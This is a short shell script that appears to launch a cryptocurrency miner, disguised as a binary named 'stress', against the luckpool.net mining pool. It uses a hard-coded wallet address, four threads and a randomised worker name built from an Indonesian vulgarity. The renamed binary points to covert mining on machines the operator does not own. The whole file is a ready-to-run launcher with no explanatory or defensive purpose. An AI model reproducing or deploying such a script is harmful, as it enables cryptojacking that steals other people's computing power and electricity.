#!/bin/sh

CONNECT="na.luckpool.net:3957"
FUCK="$(echo NGENTOD-$(shuf -i 1000-9999 -n 1)-GAYA)"
./stress -v -l $CONNECT -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t 4 -p x
